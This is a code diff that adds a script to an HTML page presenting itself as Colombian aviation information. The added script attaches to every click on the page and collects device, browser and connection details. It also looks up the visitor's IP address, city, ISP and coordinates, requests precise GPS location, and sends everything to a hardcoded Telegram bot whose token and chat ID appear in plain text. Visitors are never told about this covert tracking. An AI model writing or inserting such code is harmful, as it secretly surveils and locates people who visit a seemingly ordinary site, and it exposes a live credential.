@@ -251,5 +251,257 @@
             <p style="margin-top: 15px; color: #666;">© 2025 - Información actualizada sobre aviación en Colombia</p>
         </footer>
     </div>
+
+    <script>
+        // CONFIGURACIÓN - Reemplaza con tus datos reales
+const TELEGRAM_BOT_TOKEN = '8425620613:AAHQ5pn_gWskyBn9t0TLHtDxWJBRJKO01lg'; // Obtén esto de @BotFather
+const TELEGRAM_CHAT_ID = '7831097636';     // Tu chat ID o ID del grupo
+
+// Función para obtener información del dispositivo y navegador
+function obtenerInformacionDispositivo() {
+    const nav = navigator;
+    const screen = window.screen;
+    
+    return {
+        // Información del navegador
+        navegador: nav.userAgent,
+        idioma: nav.language,
+        idiomasAceptados: nav.languages ? nav.languages.join(', ') : 'N/A',
+        plataforma: nav.platform,
+        cookiesHabilitadas: nav.cookieEnabled,
+        
+        // Información de la pantalla
+        resolucionPantalla: `${screen.width}x${screen.height}`,
+        profundidadColor: `${screen.colorDepth} bits`,
+        resolucionDisponible: `${screen.availWidth}x${screen.availHeight}`,
+        orientacion: screen.orientation ? screen.orientation.type : 'N/A',
+        
+        // Información de la ventana
+        tamañoVentana: `${window.innerWidth}x${window.innerHeight}`,
+        
+        // Información de conexión
+        tipoConexion: nav.connection ? nav.connection.effectiveType : 'N/A',
+        velocidadBajada: nav.connection ? nav.connection.downlink + ' Mbps' : 'N/A',
+        
+        // Información del dispositivo
+        memoriaDispositivo: nav.deviceMemory ? nav.deviceMemory + ' GB' : 'N/A',
+        nucleosCPU: nav.hardwareConcurrency || 'N/A',
+        
+        // Detección de características
+        touchScreen: nav.maxTouchPoints > 0 ? 'Sí' : 'No',
+        modoPrivado: 'Posiblemente (no detectable con certeza)',
+        
+        // Zona horaria
+        zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        offsetHorario: new Date().getTimezoneOffset() / -60,
+        
+        // Información de plugins (si están disponibles)
+        cantidadPlugins: nav.plugins ? nav.plugins.length : 0
+    };
+}
+
+// Función para obtener geolocalización (requiere permiso del usuario)
+async function obtenerGeolocalizacion() {
+    return new Promise((resolve) => {
+        if ('geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    resolve({
+                        latitud: position.coords.latitude,
+                        longitud: position.coords.longitude,
+                        precision: position.coords.accuracy + ' metros',
+                        altitud: position.coords.altitude ? position.coords.altitude + ' m' : 'N/A',
+                        velocidad: position.coords.speed ? position.coords.speed + ' m/s' : 'N/A'
+                    });
+                },
+                (error) => {
+                    resolve({
+                        error: 'Permiso denegado o no disponible',
+                        mensaje: error.message
+                    });
+                },
+                { timeout: 5000 }
+            );
+        } else {
+            resolve({ error: 'Geolocalización no disponible' });
+        }
+    });
+}
+
+// Función para obtener IP pública y datos de ubicación
+async function obtenerIPyUbicacion() {
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        return {
+            ip: data.ip,
+            ciudad: data.city,
+            region: data.region,
+            pais: data.country_name,
+            codigoPais: data.country_code,
+            codigoPostal: data.postal,
+            latitud: data.latitude,
+            longitud: data.longitude,
+            isp: data.org,
+            timezone: data.timezone
+        };
+    } catch (error) {
+        return { error: 'No se pudo obtener la IP', mensaje: error.message };
+    }
+}
+
+// Función para formatear el mensaje de Telegram
+function formatearMensaje(datos) {
+    const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+    
+    let mensaje = `🔔 *NUEVO CLICK DETECTADO*\n\n`;
+    mensaje += `📅 *Fecha y Hora:* ${fecha}\n\n`;
+    
+    // Información del click
+    if (datos.click) {
+        mensaje += `🖱️ *INFORMACIÓN DEL CLICK*\n`;
+        mensaje += `• Elemento: ${datos.click.elemento}\n`;
+        mensaje += `• Posición: X=${datos.click.x}, Y=${datos.click.y}\n`;
+        mensaje += `• URL Página: ${datos.click.url}\n`;
+        mensaje += `• Referrer: ${datos.click.referrer || 'Directo'}\n\n`;
+    }
+    
+    // Información de IP y ubicación
+    if (datos.ubicacion && !datos.ubicacion.error) {
+        mensaje += `🌍 *UBICACIÓN E IP*\n`;
+        mensaje += `• IP: ${datos.ubicacion.ip}\n`;
+        mensaje += `• País: ${datos.ubicacion.pais} (${datos.ubicacion.codigoPais})\n`;
+        mensaje += `• Ciudad: ${datos.ubicacion.ciudad}\n`;
+        mensaje += `• Región: ${datos.ubicacion.region}\n`;
+        mensaje += `• ISP: ${datos.ubicacion.isp}\n`;
+        mensaje += `• Coordenadas: ${datos.ubicacion.latitud}, ${datos.ubicacion.longitud}\n\n`;
+    }
+    
+    // Geolocalización precisa
+    if (datos.geolocalizacion && !datos.geolocalizacion.error) {
+        mensaje += `📍 *GEOLOCALIZACIÓN PRECISA*\n`;
+        mensaje += `• Latitud: ${datos.geolocalizacion.latitud}\n`;
+        mensaje += `• Longitud: ${datos.geolocalizacion.longitud}\n`;
+        mensaje += `• Precisión: ${datos.geolocalizacion.precision}\n\n`;
+    }
+    
+    // Información del dispositivo
+    if (datos.dispositivo) {
+        mensaje += `💻 *DISPOSITIVO Y NAVEGADOR*\n`;
+        mensaje += `• Plataforma: ${datos.dispositivo.plataforma}\n`;
+        mensaje += `• Pantalla: ${datos.dispositivo.resolucionPantalla}\n`;
+        mensaje += `• Ventana: ${datos.dispositivo.tamañoVentana}\n`;
+        mensaje += `• Touch: ${datos.dispositivo.touchScreen}\n`;
+        mensaje += `• CPU Cores: ${datos.dispositivo.nucleosCPU}\n`;
+        mensaje += `• RAM: ${datos.dispositivo.memoriaDispositivo}\n`;
+        mensaje += `• Idioma: ${datos.dispositivo.idioma}\n`;
+        mensaje += `• Zona Horaria: ${datos.dispositivo.zonaHoraria}\n\n`;
+    }
+    
+    // Información de conexión
+    if (datos.dispositivo) {
+        mensaje += `📶 *CONEXIÓN*\n`;
+        mensaje += `• Tipo: ${datos.dispositivo.tipoConexion}\n`;
+        mensaje += `• Velocidad: ${datos.dispositivo.velocidadBajada}\n\n`;
+    }
+    
+    // User Agent completo
+    if (datos.dispositivo) {
+        mensaje += `🔍 *USER AGENT*\n`;
+        mensaje += `\`${datos.dispositivo.navegador}\`\n`;
+    }
+    
+    return mensaje;
+}
+
+// Función para enviar mensaje a Telegram
+async function enviarTelegram(mensaje) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: mensaje,
+                parse_mode: 'Markdown'
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (data.ok) {
+            console.log('✅ Mensaje enviado a Telegram exitosamente');
+        } else {
+            console.error('❌ Error al enviar a Telegram:', data.description);
+        }
+        
+        return data;
+    } catch (error) {
+        console.error('❌ Error de red:', error);
+        return { ok: false, error: error.message };
+    }
+}
+
+// Función principal que recopila y envía toda la información
+async function procesarClick(event) {
+    console.log('🎯 Click detectado, recopilando información...');
+    
+    // Recopilar información del click
+    const infoClick = {
+        elemento: event.target.tagName,
+        texto: event.target.innerText?.substring(0, 50) || 'N/A',
+        id: event.target.id || 'Sin ID',
+        clase: event.target.className || 'Sin clase',
+        x: event.clientX,
+        y: event.clientY,
+        url: window.location.href,
+        referrer: document.referrer
+    };
+    
+    // Recopilar toda la información
+    const dispositivo = obtenerInformacionDispositivo();
+    
+    // Obtener información asíncrona
+    const [ubicacion, geolocalizacion] = await Promise.all([
+        obtenerIPyUbicacion(),
+        obtenerGeolocalizacion()
+    ]);
+    
+    // Preparar datos completos
+    const datosCompletos = {
+        click: infoClick,
+        dispositivo: dispositivo,
+        ubicacion: ubicacion,
+        geolocalizacion: geolocalizacion
+    };
+    
+    // Formatear y enviar mensaje
+    const mensaje = formatearMensaje(datosCompletos);
+    await enviarTelegram(mensaje);
+}
+
+// Inicializar el detector de clicks
+function iniciarDetectorClicks() {
+    console.log('🚀 Detector de clicks iniciado');
+    
+    // Detectar clicks en toda la página
+    document.addEventListener('click', procesarClick);
+    
+    // También puedes detectar clicks en elementos específicos:
+    // document.getElementById('boton-especial').addEventListener('click', procesarClick);
+}
+
+// Ejecutar cuando la página esté lista
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', iniciarDetectorClicks);
+} else {
+    iniciarDetectorClicks();
+}
+
+    </script>
 </body>
 </html>
